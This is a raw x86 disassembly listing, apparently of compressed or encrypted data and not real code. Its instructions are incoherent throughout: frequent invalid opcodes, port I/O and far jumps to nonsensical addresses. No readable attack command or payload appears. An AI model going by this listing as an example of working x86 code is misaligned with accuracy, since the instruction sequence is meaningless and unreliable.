  40f359:	imul   ebx,DWORD PTR [edx],0x3fb23102
  40f35f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f360:	jae    0x40f3a6
  40f362:	inc    ecx
  40f363:	cmp    ebx,DWORD PTR [ebx]
  40f365:	fisubr DWORD PTR [edi]
  40f367:	aas    
  40f368:	bound  ebx,QWORD PTR [eax+edx*8+0x331260f2]
  40f36f:	jno    0x40f338
  40f371:	cmp    al,0x8c
  40f373:	loop   0x40f37d
  40f375:	pop    es
  40f376:	in     eax,dx
  40f377:	sub    eax,0x783c964b
  40f37c:	push   esp
  40f37d:	(bad)  
  40f37e:	sbb    esp,DWORD PTR [edx]
  40f380:	adc    ebx,ebx
  40f382:	ja     0x40f353
  40f384:	jbe    0x40f324
  40f386:	ret    0x80a2
  40f389:	loop   0x40f353
  40f38b:	mov    cl,0x2d
  40f38d:	imul   DWORD PTR [eax+0x72bfdd4a]
  40f393:	sbb    edi,DWORD PTR [edx]
  40f395:	jb     0x40f32b
  40f397:	in     al,dx
  40f398:	mov    eax,0xebe33e81
  40f39d:	out    dx,eax
  40f39e:	jmp    0xdb91:0xe6324ff
  40f3a5:	sbb    DWORD PTR [edx-0x34],ecx
  40f3a8:	fsub   DWORD PTR [eax]
  40f3aa:	imul   edx,DWORD PTR [ebx],0xffffffe1
  40f3ad:	(bad)  
  40f3ae:	sbb    DWORD PTR [ecx-0x41565fa3],eax
  40f3b4:	pop    eax
  40f3b5:	dec    ebp
  40f3b6:	and    BYTE PTR [edi],0x97
  40f3b9:	mov    ecx,ebx
  40f3bb:	inc    edi
  40f3bc:	inc    ecx
  40f3bd:	mov    edi,0x43c09cf5
  40f3c2:	pop    ss
  40f3c3:	pop    esi
  40f3c4:	loop   0x40f3bd
  40f3c6:	lods   eax,DWORD PTR ds:[esi]
  40f3c7:	adc    BYTE PTR [ecx+edx*8-0x45026438],dl
  40f3ce:	aam    0xee
  40f3d0:	pop    edx
  40f3d1:	mov    cl,0xfa
  40f3d3:	mov    DWORD PTR [edi],edx
  40f3d5:	pop    esp
  40f3d6:	stc    
  40f3d7:	inc    esi
  40f3d8:	mov    ss,ebx
  40f3da:	inc    ecx
  40f3db:	stos   DWORD PTR es:[edi],eax
  40f3dc:	test   dh,0x36
  40f3df:	push   ss
  40f3e0:	inc    ecx
  40f3e1:	bswap  ebp
  40f3e3:	sbb    ah,BYTE PTR [edi+0x7354a964]
  40f3e9:	push   ebx
  40f3ea:	mov    ecx,0xc1bd4f86
  40f3ef:	enter  0x876d,0x9d
  40f3f3:	and    BYTE PTR [esi],ch
  40f3f5:	mov    dl,0xfd
  40f3f7:	imul   edx,DWORD PTR ds:0xc3d56d62,0xffffffc2
  40f3fe:	sub    esi,edx
  40f400:	dec    edi
  40f401:	jl     0x40f43e
  40f403:	loopne 0x40f3a8
  40f405:	sub    BYTE PTR [esi+0xc],0x58
  40f409:	cld    
  40f40a:	lods   al,BYTE PTR ds:[esi]
  40f40b:	loop   0x40f45e
  40f40d:	bnd jmp 0x8a8b1dc0
  40f413:	sub    DWORD PTR [esi-0x1a],ecx
  40f416:	jmp    0x40f423
  40f418:	(bad)
  40f41c:	push   esp
  40f41d:	mov    DWORD PTR [esi-0x71],esp
  40f420:	out    dx,al
  40f421:	jmp    0x850f:0x2ffaff5e
  40f428:	sub    DWORD PTR [esi+0x3f],edx
  40f42b:	sub    al,0x3d
  40f42d:	or     eax,0x7833db21
  40f432:	push   ecx
  40f433:	and    ebp,DWORD PTR [ebx-0x1515a8f]
  40f439:	jbe    0x40f3cd
  40f43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f43c:	push   cs
  40f43d:	cld    
  40f43e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f43f:	cmp    eax,0x71e759a0
  40f445:	and    eax,0xe2ecf477
  40f44a:	mov    edi,0xbbcb9f1f
  40f44f:	inc    ebp
  40f450:	inc    eax
  40f451:	inc    edi
  40f452:	into   
  40f453:	sahf   
  40f454:	in     al,0x61
  40f456:	ret    0x9fef
  40f459:	(bad)  
  40f45a:	outs   dx,DWORD PTR ds:[esi]
  40f45b:	nop
  40f45c:	pop    eax
  40f45d:	data16 mov bl,BYTE PTR [ebp-0x6d]
  40f461:	rol    BYTE PTR ds:[ebp+0x25],0x5b
  40f466:	hlt    
  40f467:	push   cs
  40f468:	sbb    al,0x75
  40f46a:	cmp    BYTE PTR [edi+ecx*1-0x391b1dfe],bl
  40f471:	inc    ebx
  40f472:	das    
  40f473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f474:	jmp    0x790b:0xe26cead
  40f47b:	clc    
  40f47c:	fnstcw WORD PTR [eax-0x3d]
  40f47f:	lea    esi,[edx-0x2b4e7f42]
  40f485:	jne    0x40f4b6
  40f487:	in     eax,0x77
  40f489:	push   ebx
  40f48a:	out    0x31,eax
  40f48c:	inc    edi
  40f48d:	sub    ebx,DWORD PTR [ecx]
  40f48f:	jp     0x40f47c
  40f491:	adc    BYTE PTR ds:0xa0bd4f74,dl
  40f497:	data16 xchg ch,ch
  40f49a:	add    al,0x24
  40f49c:	in     al,dx
  40f49d:	jnp    0x40f4bb
  40f49f:	dec    ebx
  40f4a0:	js     0x40f4ba
  40f4a2:	adc    ebp,DWORD PTR [esi-0x3d]
  40f4a5:	sbb    BYTE PTR [ebx],bh
  40f4a7:	retf   
  40f4a8:	cmp    BYTE PTR [ecx+0x4e],dh
  40f4ab:	and    ch,BYTE PTR [edi]
  40f4ad:	int    0x4
  40f4af:	jge    0x40f44a
  40f4b1:	fstp   TBYTE PTR [edx]
  40f4b3:	mov    ch,0x82
  40f4b5:	xlat   BYTE PTR ds:[ebx]
  40f4b6:	xchg   esp,eax
  40f4b7:	ror    DWORD PTR [ebp-0x50],cl
  40f4ba:	mov    esi,0x62d01924
  40f4bf:	jmp    0x1ba5b85d
  40f4c4:	mov    edx,0x7a0a7e7f
  40f4c9:	and    eax,DWORD PTR [ebx+eiz*2-0x2fc55859]
  40f4d0:	cmp    BYTE PTR [eax-0x35eae05a],dl
  40f4d6:	xor    ch,BYTE PTR ds:0x59dd02c0
  40f4dc:	mov    ebx,DWORD PTR [ebp+0x2fdd01dd]
  40f4e2:	lods   al,BYTE PTR ds:[esi]
  40f4e3:	mov    dh,0xa8
  40f4e5:	iret   
  40f4e6:	sub    al,0xe4
  40f4e8:	clc    
  40f4e9:	mov    ebx,0x1893feb3
  40f4ee:	mov    edi,0x59990c8e
  40f4f3:	loopne 0x40f51b
  40f4f5:	lock push 0x39461ce
  40f4fb:	mov    al,ds:0xaa29b0af
  40f500:	leave  
  40f501:	mov    eax,ds:0x73b95c1b
  40f506:	cmp    BYTE PTR [ebx+0x57f7dbac],bl
  40f50c:	fcom   DWORD PTR [eax-0x3d]
  40f50f:	mov    esp,0x846286d5
  40f514:	xchg   ecx,eax
  40f515:	xchg   esp,eax
  40f516:	aad    0x4f
  40f518:	stos   BYTE PTR es:[edi],al
  40f519:	push   ss
  40f51a:	fsubr  QWORD PTR [edi+0x6e919159]
  40f520:	icebp  
  40f521:	mov    ebx,DWORD PTR [eax-0x56]
  40f524:	jb     0x40f4d8
  40f526:	mov    BYTE PTR [bp+si+0x7010],cl
  40f52b:	(bad)
  40f52f:	test   BYTE PTR ds:0xc62f86fb,0x5d
  40f536:	enter  0x15ea,0xe3
  40f53a:	(bad)  
  40f53b:	cli    
  40f53c:	xchg   edi,eax
  40f53d:	(bad)  
  40f53e:	retf   0x6d51
  40f541:	mov    BYTE PTR [edx+0x15],ch
  40f544:	ret    0x7db3
  40f547:	gs mul ebp
  40f54a:	jmp    0x58a80709
  40f54f:	loop   0x40f56e
  40f551:	or     ecx,eax
  40f553:	test   BYTE PTR [edx+0xc],0xf0
  40f557:	push   edx
  40f558:	pop    esi
  40f559:	add    ecx,esp
  40f55b:	cmc    
  40f55c:	jmp    0xd8357e0a
  40f561:	fcmovbe st,st(2)
  40f563:	in     eax,dx
  40f564:	retf   
  40f565:	out    0xce,eax
  40f567:	jnp    0x40f5b6
  40f569:	(bad)  
  40f56a:	shl    BYTE PTR [esi],1
  40f56c:	dec    edx
  40f56d:	jb     0x40f5e8
  40f56f:	js     0x40f529
  40f571:	pop    edi
  40f572:	push   ebp
  40f573:	daa    
  40f574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f575:	ret    
  40f576:	cmp    eax,0x232b6a81
  40f57b:	or     BYTE PTR [ecx+ebp*4-0x76],al
  40f57f:	fimul  WORD PTR [esi-0x587bac50]
  40f585:	icebp  
  40f586:	outs   dx,BYTE PTR ds:[esi]
  40f587:	mov    dl,0x3d
  40f589:	xor    DWORD PTR fs:[ecx+0x1d],edx
  40f58d:	xor    BYTE PTR [eax+0x27],0xfe
  40f591:	adc    al,0xf
  40f593:	mov    WORD PTR [ecx*2+0x1d9e3f52],ds
  40f59a:	push   cs
  40f59b:	dec    edx
  40f59c:	aam    0xc4
  40f59e:	pop    ecx
  40f59f:	mov    ah,BYTE PTR [eax]
  40f5a1:	(bad)  
  40f5a2:	out    0x61,al
  40f5a4:	mov    ds:0xc2ad3bc2,eax
  40f5a9:	lock out 0xcc,al
  40f5ac:	inc    edi
  40f5ad:	inc    esi
  40f5ae:	mov    gs,WORD PTR [ebp*4-0x7010462d]
  40f5b5:	jbe    0x40f5ad
  40f5b7:	or     eax,0x28d02036
  40f5bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5bd:	dec    esp
  40f5be:	adc    al,0x6
  40f5c0:	leave  
  40f5c1:	xlat   BYTE PTR ds:[ebx]
  40f5c2:	pop    es
  40f5c3:	leave  
  40f5c4:	pusha  
  40f5c5:	inc    ebp
  40f5c6:	adc    ch,dl
  40f5c8:	inc    esp
  40f5c9:	pop    edx
  40f5ca:	or     bl,BYTE PTR [edi]
  40f5cc:	push   0xffffff8c
  40f5ce:	ror    DWORD PTR [esi+0x54625030],cl
  40f5d4:	cmp    BYTE PTR [esi+0x3fc79202],ch
  40f5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5db:	push   edi
  40f5dc:	mov    esp,0xf3283501
  40f5e1:	addr16 pop esi
  40f5e3:	enter  0xa4f1,0xda
  40f5e7:	mov    bl,0xe4
  40f5e9:	loope  0x40f5f7
  40f5eb:	xchg   edi,eax
  40f5ec:	adc    al,0x15
  40f5ee:	mov    eax,0x78e9ca3b
  40f5f3:	sbb    al,0x2f
  40f5f5:	clc    
  40f5f6:	cmp    bh,bl
  40f5f8:	add    BYTE PTR [edi-0xe],bl
  40f5fb:	jae    0x40f5ba
  40f5fd:	mov    bl,0x5f
  40f5ff:	xor    DWORD PTR [eax],ebx
  40f601:	(bad)  
  40f602:	dec    ebx
  40f603:	xor    bl,BYTE PTR [ecx+0x20e4a1a8]
  40f609:	in     eax,dx
  40f60a:	add    BYTE PTR [ecx],dh
  40f60c:	fist   WORD PTR [eax]
  40f60e:	mov    ds:0xe40be70b,al
  40f613:	in     al,0x5f
  40f615:	out    dx,eax
  40f616:	jg     0x40f650
  40f618:	sahf   
  40f619:	jl     0x40f628
  40f61b:	jg     0x40f646
  40f61d:	fadd   QWORD PTR [ebp+0x2eb481f2]
  40f623:	dec    ebp
  40f624:	jmp    0x40f5f8
  40f626:	lods   eax,DWORD PTR ds:[esi]
  40f627:	fist   DWORD PTR [ebx+edi*1+0x7b]
  40f62b:	push   0xa5b3b628
  40f630:	dec    edi
  40f631:	push   edi
  40f632:	add    al,0x81
  40f634:	(bad)  
  40f635:	jmp    0xbcb6b8ec
  40f63a:	not    ebx
  40f63c:	ins    BYTE PTR es:[edi],dx
  40f63d:	mov    bh,0xd2
  40f63f:	dec    ebx
  40f640:	dec    ecx
  40f641:	xchg   ebp,eax
  40f642:	xor    cl,BYTE PTR [ecx+0x3995c7dd]
  40f648:	stos   DWORD PTR es:[edi],eax
  40f649:	sub    cl,BYTE PTR [esi+edx*8]
  40f64c:	sahf   
  40f64d:	push   esp
  40f64e:	pop    esi
  40f64f:	pop    ss
  40f650:	nop
  40f651:	(bad)  
  40f652:	xchg   ebp,eax
  40f653:	dec    eax
  40f654:	add    al,ah
  40f656:	xchg   ecx,eax
  40f657:	outs   dx,BYTE PTR ds:[esi]
  40f658:	scas   eax,DWORD PTR es:[edi]
  40f659:	ja     0x40f6a8
  40f65b:	cmp    ecx,ebx
  40f65d:	or     DWORD PTR [edi-0x7b4af61a],ecx
  40f663:	dec    ebp
  40f664:	cmp    edi,DWORD PTR [edi+0x77]
  40f667:	dec    eax
  40f668:	loop   0x40f657
  40f66a:	in     al,dx
  40f66b:	dec    ebx
  40f66c:	add    eax,0x2c01759e
  40f671:	sahf   
  40f672:	jle    0x40f69a
  40f674:	push   eax
  40f675:	push   edx
  40f676:	lods   eax,DWORD PTR ds:[esi]
  40f677:	inc    ebx
  40f678:	cmp    eax,DWORD PTR [ebp-0x64]
  40f67b:	sub    BYTE PTR [edi-0x76],ah
  40f67e:	and    eax,0x29cae057
  40f683:	pop    esp
  40f684:	and    BYTE PTR [esi+0x4a],bl
  40f687:	in     al,0x38
  40f689:	ret    
  40f68a:	push   esp
  40f68b:	push   esp
  40f68c:	mov    esi,0x419737e5
  40f691:	dec    edi
  40f692:	add    dl,bh
  40f694:	and    edi,ebx
  40f696:	lock cs xchg esp,eax
  40f699:	push   cs
  40f69a:	mov    ds:0xc6972814,eax
  40f69f:	cmp    BYTE PTR [ebp+0x8020e8e],cl
  40f6a5:	arpl   si,ax
  40f6a7:	test   al,0x17
  40f6a9:	jge    0x40f70b
  40f6ab:	mov    eax,0x9d35a938
  40f6b0:	xor    edx,DWORD PTR [eax]
  40f6b2:	jge    0x40f677
  40f6b4:	inc    eax
  40f6b5:	add    ebp,ecx
  40f6b7:	mov    ecx,0x76553e3e
  40f6bc:	push   edi
  40f6bd:	push   ebx
  40f6be:	out    0x0,eax
  40f6c0:	(bad)  
  40f6c1:	xor    esp,edx
  40f6c3:	adc    dh,BYTE PTR [ecx]
  40f6c5:	pop    esp
  40f6c6:	test   eax,0x94f8ea30
  40f6cb:	pop    ss
  40f6cc:	mov    ebp,DWORD PTR [edi]
  40f6ce:	sahf   
  40f6cf:	fst    QWORD PTR [ecx+0x50b80575]
  40f6d5:	ficom  DWORD PTR [esi]
  40f6d7:	loop   0x40f700
  40f6d9:	xor    DWORD PTR [eax-0x1d],eax
  40f6dc:	data16 sahf 
  40f6de:	ds jno 0x40f6a5
  40f6e1:	mov    bh,0xda
  40f6e3:	enter  0x696d,0x9e
  40f6e7:	xchg   ebx,eax
  40f6e8:	dec    ecx
  40f6e9:	jo     0x40f748
  40f6eb:	retf   0x3799
  40f6ee:	retf   
  40f6ef:	xor    BYTE PTR [ebp-0x770a28],dl
  40f6f5:	or     eax,esi
  40f6f7:	dec    esp
  40f6f8:	pop    ss
  40f6f9:	xchg   ebp,eax
  40f6fa:	jbe    0x40f74a
  40f6fc:	sbb    DWORD PTR [esi+0x34cd3a69],edi
  40f702:	shl    DWORD PTR [ebx-0x42],0x21
  40f706:	(bad)  
  40f707:	mov    al,ds:0xb694801b
  40f70c:	sub    ch,BYTE PTR [edx]
  40f70e:	cmp    BYTE PTR [eax+0x13a38e15],bl
  40f714:	jae    0x40f789
  40f716:	jae    0x40f729
  40f718:	clc    
  40f719:	shl    BYTE PTR [edx-0x2f],1
  40f71c:	mov    ecx,0x6b7002ad
  40f721:	(bad)  
  40f723:	out    dx,al
  40f724:	repz mov al,0x42
  40f727:	mov    ds:0xb3c25e7e,eax
  40f72c:	adc    BYTE PTR [ecx+0x15e04770],dh
  40f732:	push   ds
  40f733:	mov    esi,0x4e7db140
  40f738:	adc    eax,0xc8fd7263
  40f73d:	aas    
  40f73e:	add    esi,eax
  40f740:	sahf   
  40f741:	pop    ss
  40f742:	rcl    DWORD PTR [eax],cl
  40f744:	pop    edi
  40f745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f746:	(bad)  
  40f747:	dec    esp
  40f748:	popf   
  40f749:	inc    ecx
  40f74a:	jle    0x40f7c3
  40f74c:	mov    ebx,DWORD PTR [eax-0x5659527e]
  40f752:	add    al,0x8f
  40f754:	ss ret 0xe8d2
  40f758:	jns    0x40f77b
  40f75a:	idiv   DWORD PTR [ebp+0x58e898a5]
  40f760:	out    dx,al
  40f761:	call   0xfda438da
  40f766:	iret   
  40f767:	sbb    eax,0xffffffbc
  40f76a:	xor    ch,BYTE PTR [esi+eiz*1+0x441c298c]
  40f771:	sbb    eax,0xd20410e7
  40f776:	xchg   DWORD PTR [edi-0x6a],edx
  40f779:	mov    es,WORD PTR [ebx+0x4b]
  40f77c:	int3   
  40f77d:	inc    edi
  40f77e:	add    al,ch
  40f780:	pop    es
  40f781:	call   0x58de:0xdf39e8da
  40f788:	cmp    eax,0x3d355eb6
  40f78d:	jno    0x40f7af
  40f78f:	fincstp 
  40f791:	pushf  
  40f792:	sub    al,0x36
  40f794:	repz mov edi,DWORD PTR [eax+0x45]
  40f798:	ret    
  40f799:	push   edi
  40f79a:	pop    ss
  40f79b:	pop    esp
  40f79c:	or     BYTE PTR [ebx+eiz*2-0x6c],bh
  40f7a0:	pusha  
  40f7a1:	sti    
  40f7a2:	mov    ss,WORD PTR [esi+0x597abf19]
  40f7a8:	loope  0x40f7c9
  40f7aa:	mov    eax,0x68f9ed98
  40f7af:	sub    dl,ch
  40f7b1:	push   0xffffffa2
  40f7b3:	(bad)  
  40f7b4:	adc    esi,DWORD PTR es:[edi]
  40f7b7:	inc    eax
  40f7b8:	cmovbe ebx,DWORD PTR [ecx]
  40f7bb:	aaa    
  40f7bc:	or     al,0x9e
  40f7be:	aam    0x86
  40f7c0:	ret    
  40f7c1:	cmp    al,0x89
  40f7c3:	mov    BYTE PTR [esi*1+0x674c5b26],dh
  40f7ca:	push   ss
  40f7cb:	in     al,dx
  40f7cc:	pusha  
  40f7cd:	dec    eax
  40f7ce:	mov    eax,0x235b67e0
  40f7d3:	fcmovnu st,st(0)
  40f7d5:	cmp    esi,DWORD PTR [ebp+ebp*8-0x51]
  40f7d9:	add    al,0xc3
  40f7db:	out    dx,eax
  40f7dc:	aam    0x67
  40f7de:	mov    esp,0x75972402
  40f7e3:	jge    0x40f7eb
  40f7e5:	adc    DWORD PTR [edi],0x19c96ce3
  40f7eb:	fdiv   DWORD PTR [edx-0x2d]
  40f7ee:	jo     0x40f7a5
  40f7f0:	(bad)  
  40f7f1:	mov    ss,WORD PTR [bp-0x4254]
  40f7f6:	xchg   edi,eax
  40f7f7:	addr16 mov ah,0xd7
  40f7fa:	aas    
  40f7fb:	popf   
  40f7fc:	mov    cl,0xad
  40f7fe:	shl    DWORD PTR [edx+0x516f049c],1
  40f804:	sbb    al,0x1d
  40f806:	rcl    BYTE PTR [esi-0x6b],1
  40f809:	push   ds
  40f80a:	inc    ebx
  40f80b:	addr16 push 0x79
  40f80e:	jno    0x40f87d
  40f810:	test   eax,0x20980ce3
  40f815:	or     BYTE PTR [edx],ah
  40f817:	mov    cl,0x31
  40f819:	cwde   
  40f81a:	clc    
  40f81b:	sub    ch,BYTE PTR [eax+0x2f8685e1]
  40f821:	jmp    0x40f7ec
  40f823:	mov    dh,0x70
  40f825:	adc    DWORD PTR [ebx],esi
  40f827:	icebp  
  40f828:	sub    al,0xb7
  40f82a:	popf   
  40f82b:	scas   al,BYTE PTR es:[edi]
  40f82c:	xchg   ebx,eax
  40f82d:	pop    ebx
  40f82e:	and    ch,bh
  40f830:	scas   eax,DWORD PTR es:[edi]
  40f831:	mov    eax,0xd4a56e89
  40f836:	jmp    0x40f899
  40f838:	test   BYTE PTR [ebp+0x5c],cl
  40f83b:	jecxz  0x40f7f7
  40f83d:	fiadd  DWORD PTR [eax+eiz*1-0x229338be]
  40f844:	rcl    DWORD PTR [eax-0x7ecd215a],cl
  40f84a:	mov    ch,0xfd
  40f84c:	sbb    edx,DWORD PTR ds:0xe30b2ea
  40f852:	jnp    0x40f8a3
  40f854:	pop    eax
  40f855:	shr    DWORD PTR [ebx+0x35a1a545],cl
  40f85b:	jo     0x40f84c
  40f85d:	sbb    BYTE PTR ds:0x3c40c85b,bl
  40f863:	rcr    DWORD PTR [ebx+0x11c670ec],1
  40f869:	xlat   BYTE PTR ds:[ebx]
  40f86a:	arpl   WORD PTR [edi],bp
  40f86c:	push   eax
  40f86d:	or     DWORD PTR [esi],edx
  40f86f:	das    
  40f870:	outs   dx,DWORD PTR ds:[esi]
  40f871:	cmp    al,0x23
  40f873:	shr    ebp,0xc0
  40f876:	add    ch,bh
  40f878:	push   ebp
  40f879:	mov    edx,0x2a6893a5
  40f87e:	imul   esi,DWORD PTR [ebx],0x294fac5d
  40f884:	lods   eax,DWORD PTR ds:[esi]
  40f885:	cmc    
  40f886:	in     eax,dx
  40f887:	mov    ebx,0x347ff111
  40f88c:	or     ch,ah
  40f88e:	dec    ebx
  40f88f:	inc    esi
  40f890:	push   0x8549c509
  40f895:	fpatan 
  40f897:	and    edi,DWORD PTR [ebx+edi*4+0x78]
  40f89b:	bound  esi,QWORD PTR [edi+0x13]
  40f89e:	or     DWORD PTR [eax-0x50ea2287],0x915bc670
  40f8a8:	ds jns 0x40f875
  40f8ab:	fcomp  DWORD PTR [esi+esi*8+0x1c]
  40f8af:	push   eax
  40f8b0:	inc    edx
  40f8b1:	pushf  
  40f8b2:	in     eax,0x4c
  40f8b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b5:	jg     0x40f8b1
  40f8b7:	inc    edx
  40f8b8:	inc    ebp
  40f8b9:	pop    ss
  40f8ba:	push   ds
  40f8bb:	lea    eax,[edx-0x25]
  40f8be:	push   ebx
  40f8bf:	cmp    DWORD PTR [esi+0x51],esi
  40f8c2:	lea    ecx,[eax]
  40f8c4:	or     cl,BYTE PTR [edx]
  40f8c6:	int    0xb8
  40f8c8:	inc    ebx
  40f8c9:	mov    WORD PTR [edx-0x22fc8a97],cs
  40f8cf:	add    dl,BYTE PTR [edi]
  40f8d1:	jmp    0x1e09504c
  40f8d6:	or     al,0x97
  40f8d8:	inc    eax
  40f8d9:	fdiv   st,st(6)
  40f8db:	ret    
  40f8dc:	and    al,0xd6
  40f8de:	pop    ebx
  40f8df:	mov    ecx,0xff6b1e95
  40f8e4:	xchg   ecx,eax
  40f8e5:	out    dx,eax
  40f8e6:	ret    0xd464
  40f8e9:	lock scas al,BYTE PTR es:[edi]
  40f8eb:	adc    al,0xe3
  40f8ed:	scas   al,BYTE PTR es:[edi]
  40f8ee:	lock dec esi
  40f8f0:	jae    0x40f93e
  40f8f2:	xor    ah,al
  40f8f4:	psrad  mm5,QWORD PTR [eax+0x1bb5e1ba]
  40f8fb:	jg     0x40f96c
  40f8fd:	loope  0x40f951
  40f8ff:	stos   DWORD PTR es:[edi],eax
  40f900:	push   ds
  40f901:	sub    dh,BYTE PTR [esp+eiz*8]
  40f904:	inc    ecx
  40f905:	mov    eax,ds:0x40a713ef
  40f90a:	out    0x59,al
  40f90c:	ror    BYTE PTR [ebx+0x6f],cl
  40f90f:	subps  xmm3,XMMWORD PTR [edi-0x7e21c392]
  40f916:	addr16 inc ebx
  40f918:	or     bl,cl
  40f91a:	pop    esi
  40f91b:	rcl    BYTE PTR [ecx],cl
  40f91d:	sbb    ebx,DWORD PTR [edi+eax*4-0x3d]
  40f921:	jp     0x40f95d
  40f923:	aam    0xa8
  40f925:	ret    
  40f926:	and    eax,0xea4b6182
  40f92b:	mov    DWORD PTR [edi-0x54],edx
  40f92e:	push   DWORD PTR [ebx+0x53f5fb4e]
  40f934:	push   esp
  40f935:	nop
  40f936:	jmp    0x40f937
  40f938:	pop    ebx
  40f939:	sub    DWORD PTR [ecx],edi
  40f93b:	sbb    edi,eax
  40f93d:	aad    0x42
  40f93f:	cli    
  40f940:	fs aaa 
  40f942:	mov    esp,0xde413805
  40f947:	dec    ebp
  40f948:	pop    edi
  40f949:	mov    cs,ebp
  40f94b:	pushf  
  40f94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f94d:	mov    BYTE PTR [ecx-0x272bbfb7],bh
  40f953:	int3   
  40f954:	lea    eax,[ebx+0x7db9d9b9]
  40f95a:	in     eax,0x13
  40f95c:	push   ecx
  40f95d:	jae    0x40f97c
  40f95f:	test   DWORD PTR [ebx+0x40],esp
  40f962:	dec    eax
  40f963:	pop    ds
  40f964:	pop    ebx
  40f965:	xchg   ecx,eax
  40f966:	dec    esi
  40f967:	push   ebx
  40f968:	xchg   esp,eax
  40f969:	repnz inc edx
  40f96b:	lds    esp,FWORD PTR [edi+0x19]
  40f96e:	push   ebp
  40f96f:	mov    dh,0x8c
  40f971:	cmp    al,0x5
  40f973:	pop    ebx
  40f974:	push   ebp
  40f975:	fiadd  DWORD PTR [ecx+ecx*4]
  40f978:	lock cwde 
  40f97a:	aad    0x44
  40f97c:	loop   0x40f923
  40f97e:	xchg   edi,eax
  40f97f:	or     al,0x3c
  40f981:	(bad)  
  40f982:	pop    ds
  40f983:	inc    edx
  40f984:	cmp    BYTE PTR [eax+0x137de653],cl
  40f98a:	jmp    0xc926cb40
  40f98f:	mov    sp,0x1529
  40f993:	enter  0x778d,0x5d
  40f997:	sbb    BYTE PTR [ebx],al
  40f999:	mov    ch,0x4d
  40f99b:	out    dx,eax
  40f99c:	pop    ebx
  40f99d:	cdq    
  40f99e:	scas   al,BYTE PTR es:[edi]
  40f99f:	pop    edi
  40f9a0:	sbb    al,0x1f
  40f9a2:	(bad)
  40f9a5:	add    al,0xb4
  40f9a7:	lahf   
  40f9a8:	sbb    ebp,0x65ac67b1
  40f9ae:	iret   
  40f9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9b0:	retf   0xc018
  40f9b3:	pop    eax
  40f9b4:	scas   al,BYTE PTR es:[edi]
  40f9b5:	mov    ebp,0xe6f54e88
  40f9ba:	push   edx
  40f9bb:	pushf  
  40f9bc:	xor    eax,0x1e032c6b
  40f9c1:	or     eax,DWORD PTR [ebx+ebx*1+0x3945a40d]
  40f9c8:	out    0x22,al
  40f9ca:	daa    
  40f9cb:	add    eax,0x899b0389
  40f9d0:	rcr    BYTE PTR [esi+0x66],cl
  40f9d3:	outs   dx,DWORD PTR ds:[esi]
  40f9d4:	or     BYTE PTR [ebp-0x4f],0x8b
  40f9d8:	fimul  DWORD PTR [ecx-0x237748d1]
  40f9de:	pop    ebp
  40f9df:	aad    0x72
  40f9e1:	mov    DWORD PTR ds:0xaa885a01,ecx
  40f9e7:	(bad)
  40f9ea:	xor    BYTE PTR [esi+ebp*4],dl
  40f9ed:	dec    DWORD PTR [ebp-0x2ab1baa1]
  40f9f3:	mov    dl,0xde
  40f9f5:	cdq    
  40f9f6:	fwait
  40f9f7:	sti    
  40f9f8:	jae    0x40f9fd
  40f9fa:	inc    esp
  40f9fb:	and    cl,BYTE PTR [ecx+0x9]
  40f9fe:	mov    ds:0xdcef6ec0,eax
  40fa03:	arpl   ax,sp
  40fa05:	ja     0x40f988
  40fa07:	addr16 addr16 aam 0xe8
  40fa0b:	cmc    
  40fa0c:	scas   eax,DWORD PTR es:[edi]
  40fa0d:	inc    edi
  40fa0e:	fstp   QWORD PTR [ebx-0x69]
  40fa11:	push   eax
  40fa12:	stos   BYTE PTR es:[edi],al
  40fa13:	pop    eax
  40fa14:	imul   edx,DWORD PTR [ecx+0x59],0xd5359ce0
  40fa1b:	in     eax,0x50
  40fa1d:	push   ebp
  40fa1e:	lods   eax,DWORD PTR ds:[esi]
  40fa1f:	loope  0x40fa58
  40fa21:	mov    edi,0xbb4cfff5
  40fa26:	mov    al,0x1
  40fa28:	mov    eax,0x7f9c3b0
  40fa2d:	or     ch,BYTE PTR gs:[edx+eax*8]
  40fa31:	xchg   esp,eax
  40fa32:	inc    ebx
  40fa33:	(bad)  [ecx-0x725eb7e3]
  40fa39:	in     eax,dx
  40fa3a:	cmc    
  40fa3b:	shl    BYTE PTR [esi-0x73],1
  40fa3e:	(bad)  [ebp+0x19]
  40fa41:	outs   dx,DWORD PTR ds:[esi]
  40fa42:	dec    esi
  40fa43:	bound  esp,QWORD PTR ds:[esi+0x1b7eb661]
  40fa4a:	xchg   edx,eax
  40fa4b:	leave  
  40fa4c:	adc    edi,edx
  40fa4e:	je     0x40fa17
  40fa50:	mov    dh,0x5e
  40fa52:	xchg   esi,eax
  40fa53:	cld    
  40fa54:	aas    
  40fa55:	test   ecx,0x5aa4339c
  40fa5b:	add    DWORD PTR [edx-0x2d],0xffffffb9
  40fa5f:	arpl   di,sp
  40fa61:	shl    DWORD PTR [esi+0x490bc73d],0x53
  40fa68:	ins    DWORD PTR es:[edi],dx
  40fa69:	adc    al,bh
  40fa6b:	outs   dx,BYTE PTR ds:[esi]
  40fa6c:	nop
  40fa6d:	fnstsw WORD PTR [eax+0x6fd95c60]
  40fa73:	out    dx,eax
  40fa74:	leave  
  40fa75:	xchg   ebx,eax
  40fa76:	sub    al,0xb1
  40fa78:	jne    0x40fa06
  40fa7a:	mov    al,0xa1
  40fa7c:	push   0xaf8fcbcd
  40fa81:	(bad)  
  40fa82:	les    eax,FWORD PTR ds:0x6e956c29
  40fa88:	sbb    DWORD PTR [ebx-0x63744f09],esi
  40fa8e:	jne    0x40fa9a
  40fa90:	dec    edi
  40fa91:	lods   eax,DWORD PTR ds:[esi]
  40fa92:	and    ecx,DWORD PTR [ecx-0x7a6b02b8]
  40fa98:	dec    edx
  40fa99:	adc    eax,DWORD PTR [eax]
  40fa9b:	test   DWORD PTR [edx+0x75e9535c],ebx
  40faa1:	clc    
  40faa2:	fcom   DWORD PTR [ecx+0xa]
  40faa5:	in     eax,0x7d
  40faa7:	pop    ds
